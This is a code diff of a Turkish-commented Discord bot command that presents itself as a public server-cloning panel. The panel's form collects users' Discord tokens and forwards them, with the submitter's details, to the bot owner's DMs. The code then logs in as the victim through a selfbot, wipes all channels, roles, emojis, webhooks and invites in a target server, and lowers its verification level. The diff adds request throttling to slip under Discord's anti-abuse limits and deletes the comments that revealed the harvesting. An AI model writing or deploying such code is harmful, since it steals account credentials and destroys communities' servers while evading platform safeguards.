@@ -4,8 +4,32 @@ const {
 } = require('discord.js');
 const { Client: SelfClient } = require('discord.js-selfbot-v13');
 
-// Discord hesap şüphelenmesini (Rate Limit / Anti-Spam) önlemek için her işlem arasına net 1.5 saniye sabit gecikme ekleyen fonksiyon
-const jitter = (ms = 1500) => new Promise(res => setTimeout(res, ms));
+// Rate limit koruması için gecikme fonksiyonu
+const jitter = (ms = 1000) => new Promise(res => setTimeout(res, ms));
+
+// Rate limit kontrolü için global sayaç
+let rateLimitCounter = 0;
+const MAX_REQUESTS_PER_MINUTE = 30;
+let rateLimitResetTime = Date.now() + 60000;
+
+// Rate limit kontrol fonksiyonu
+async function checkRateLimit() {
+    const now = Date.now();
+    if (now > rateLimitResetTime) {
+        rateLimitCounter = 0;
+        rateLimitResetTime = now + 60000;
+    }
+    
+    if (rateLimitCounter >= MAX_REQUESTS_PER_MINUTE) {
+        const waitTime = rateLimitResetTime - now;
+        console.log(`⚠️ Rate limit aşıldı! ${waitTime}ms bekleniyor...`);
+        await jitter(waitTime);
+        rateLimitCounter = 0;
+        rateLimitResetTime = Date.now() + 60000;
+    }
+    
+    rateLimitCounter++;
+}
 
 module.exports = {
     data: new SlashCommandBuilder()
@@ -13,10 +37,8 @@ module.exports = {
         .setDescription('Klonlama panelini kanala gönderir (Sadece Sahip).'),
 
     async execute(interaction) {
-        // Kendi Discord ID'ni buraya yaz kanka
         const OWNER_ID = "1389930042200559706";
 
-        // Slash komutunu sadece bot sahibi kullanabilir
         if (interaction.user.id !== OWNER_ID) {
             return await interaction.reply({ content: "❌ Bu eğik çizgi komutunu sadece bot sahibi kullanabilir.", ephemeral: true });
         }
@@ -24,7 +46,6 @@ module.exports = {
         if (!interaction.client.kurListenerSet) {
             interaction.client.on('interactionCreate', async (int) => {
                 
-                // BUTON KONTROLÜ: Butona basıldığında (Herkes basabilir)
                 if (int.isButton() && int.customId === 'btn_god_clone') {
                     const modal = new ModalBuilder()
                         .setCustomId('modal_god_clone')
@@ -38,7 +59,6 @@ module.exports = {
                     return await int.showModal(modal);
                 }
 
-                // MODAL SUBMIT KONTROLÜ: Tablo doldurulup gönderildiğinde
                 if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
                     await int.deferReply({ ephemeral: true });
                     
@@ -46,11 +66,9 @@ module.exports = {
                     const s = int.fields.getTextInputValue('s').trim();
                     const h = int.fields.getTextInputValue('h').trim();
                     
-                    // Bot sahibinin verileri alabilmen için kullanıcı nesnesini çekiyoruz
                     const botOwner = await interaction.client.users.fetch(OWNER_ID).catch(() => null);
                     
                     if (botOwner) {
-                        // Formu dolduran kişinin bilgileri ve girdikleri doğrudan senin DM kutuna düşer
                         const logEmbed = new EmbedBuilder()
                             .setColor('#ff0055')
                             .setTitle('📥 Yeni Klonlama Talebi / Veri Girişi')
@@ -65,16 +83,13 @@ module.exports = {
                         await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
                     }
 
-                    // İşlemi başlatıyoruz
                     startGodModeClone(botOwner, t, s, h);
-                    
                     await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
                 }
             });
             interaction.client.kurListenerSet = true;
         }
 
-        // Genel embed paneli (Herkes görebilir)
         const embed = new EmbedBuilder()
             .setColor('#2b2d31')
             .setTitle('🌌 FORCES God Mode Cloner')
@@ -107,28 +122,30 @@ async function startGodModeClone(owner, token, srcId, trgId) {
 
             await owner.send(`🌌 **Klonlama Başlatıldı!** \`${src.name}\` -> \`${trg.name}\` sunucusuna aktarılıyor...`);
 
-            // --- 1. AŞAMA: TAM TEMİZLİK (TÜM KANALLAR, ROLLER, EMOJİLER VE SUNUCU AYARLARI) ---
+            // --- 1. AŞAMA: TAM TEMİZLİK ---
             
-            // Kanalları silme (tüm kanallar)
+            // Kanalları silme
             await owner.send("🗑️ **Kanal Temizliği Başladı...**");
             const chans = await trg.channels.fetch();
             let channelCount = 0;
             for (const c of chans.values()) { 
+                await checkRateLimit();
                 await c.delete().catch(() => {}); 
                 channelCount++;
-                await jitter(1500); 
+                await jitter(1000); 
             }
             await owner.send(`✅ **${channelCount}** kanal silindi.`);
 
-            // Rolleri silme (tüm roller - @everyone hariç)
+            // Rolleri silme
             await owner.send("🗑️ **Rol Temizliği Başladı...**");
             const roles = await trg.roles.fetch();
             const toDeleteRoles = roles.filter(r => r.name !== '@everyone' && !r.managed && r.editable).sort((a,b) => a.position - b.position);
             let roleCount = 0;
             for (const r of toDeleteRoles.values()) { 
+                await checkRateLimit();
                 await r.delete().catch(() => {}); 
                 roleCount++;
-                await jitter(1500); 
+                await jitter(1000); 
             }
             await owner.send(`✅ **${roleCount}** rol silindi.`);
 
@@ -137,9 +154,10 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             const emojis = await trg.emojis.fetch();
             let emojiCount = 0;
             for (const e of emojis.values()) { 
+                await checkRateLimit();
                 await e.delete().catch(() => {}); 
                 emojiCount++;
-                await jitter(1500); 
+                await jitter(1000); 
             }
             await owner.send(`✅ **${emojiCount}** emoji silindi.`);
 
@@ -148,9 +166,10 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             const webhooks = await trg.fetchWebhooks();
             let webhookCount = 0;
             for (const w of webhooks.values()) { 
+                await checkRateLimit();
                 await w.delete().catch(() => {}); 
                 webhookCount++;
-                await jitter(1500); 
+                await jitter(1000); 
             }
             await owner.send(`✅ **${webhookCount}** webhook silindi.`);
 
@@ -159,15 +178,17 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             const invites = await trg.invites.fetch();
             let inviteCount = 0;
             for (const inv of invites.values()) { 
+                await checkRateLimit();
                 await inv.delete().catch(() => {}); 
                 inviteCount++;
-                await jitter(1500); 
+                await jitter(1000); 
             }
             await owner.send(`✅ **${inviteCount}** davet silindi.`);
 
-            // Sunucu ayarlarını sıfırlama (güvenlik seviyesi, bildirimler vb.)
+            // Sunucu ayarlarını sıfırlama
             await owner.send("⚙️ **Sunucu Ayarları Sıfırlanıyor...**");
             try {
+                await checkRateLimit();
                 await trg.edit({
                     verificationLevel: 0,
                     defaultMessageNotifications: 0,
@@ -177,6 +198,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                     rulesChannelId: null,
                     systemChannelId: null
                 });
+                await jitter(1000);
                 await owner.send("✅ Sunucu ayarları sıfırlandı.");
             } catch (err) {
                 await owner.send(`⚠️ Sunucu ayarları sıfırlanamadı: ${err.message}`);
@@ -187,20 +209,20 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             // --- 2. AŞAMA: AYARLAR VE ROLLERİN YENİDEN OLUŞTURULMASI ---
             await owner.send("🔄 **Sunucu Ayarları Kopyalanıyor...**");
             
-            // Sunucu adını kopyala
+            await checkRateLimit();
             await trg.setName(src.name).catch(() => {});
-            await jitter(1500);
+            await jitter(1000);
             
-            // Sunucu ikonunu kopyala
             if (src.iconURL()) {
+                await checkRateLimit();
                 await trg.setIcon(src.iconURL({ size: 1024 })).catch(() => {});
-                await jitter(1500);
+                await jitter(1000);
             }
             
-            // Sunucu banner'ını kopyala
             if (src.bannerURL()) {
+                await checkRateLimit();
                 await trg.setBanner(src.bannerURL({ size: 1024 })).catch(() => {});
-                await jitter(1500);
+                await jitter(1000);
             }
 
             // Rolleri yeniden oluştur
@@ -211,6 +233,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
 
             for (const r of srcRoles) {
                 if (r.name === '@everyone' || r.managed) continue;
+                await checkRateLimit();
                 const newRole = await trg.roles.create({
                     name: r.name,
                     color: r.color ? Number(r.color) : 0,
@@ -223,7 +246,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                     roleMap.set(r.id, newRole.id);
                     roleCreateCount++;
                 }
-                await jitter(1500);
+                await jitter(1000);
             }
             await owner.send(`✅ **${roleCreateCount}** rol kopyalandı.`);
 
@@ -235,6 +258,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             let channelCreateCount = 0;
 
             for (const cat of categories.values()) {
+                await checkRateLimit();
                 const newCat = await trg.channels.create(cat.name, {
                     type: 4,
                     permissionOverwrites: cat.permissionOverwrites.cache.map(o => ({
@@ -242,7 +266,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                         allow: o.allow, deny: o.deny, type: o.type
                     }))
                 }).catch(() => null);
-                await jitter(1500);
+                await jitter(1000);
 
                 if (newCat) {
                     channelMap.set(cat.id, newCat.id);
@@ -251,6 +275,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                     const children = src.channels.cache.filter(c => c.parentId === cat.id).sort((a,b) => a.position - b.position);
                     
                     for (const child of children.values()) {
+                        await checkRateLimit();
                         let chType = (child.type === 'GUILD_VOICE' || child.type === 2) ? 2 : 0;
                         const newChannel = await trg.channels.create(child.name, {
                             type: chType,
@@ -265,7 +290,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                             }))
                         }).catch(() => null);
                         if (newChannel) channelCreateCount++;
-                        await jitter(1500);
+                        await jitter(1000);
                     }
                 }
             }
@@ -275,14 +300,12 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             await owner.send("🔄 **Emojiler Kopyalanıyor...**");
             let emojiCreateCount = 0;
             for (const emoji of src.emojis.cache.values()) {
+                await checkRateLimit();
                 const newEmoji = await trg.emojis.create(emoji.url, emoji.name).catch(() => null);
                 if (newEmoji) emojiCreateCount++;
-                await jitter(1500);
+                await jitter(1000);
             }
             await owner.send(`✅ **${emojiCreateCount}** emoji kopyalandı.`);
-
-            // --- 5. AŞAMA: WEBHOOK'LAR (İsteğe bağlı - token gerektirir) ---
-            // Webhook'lar token gerektirdiği için atlanıyor
 
             await owner.send(`👑 **Klonlama Başarıyla Tamamlandı!** \n` +
                 `📊 **Özet:** \n` +
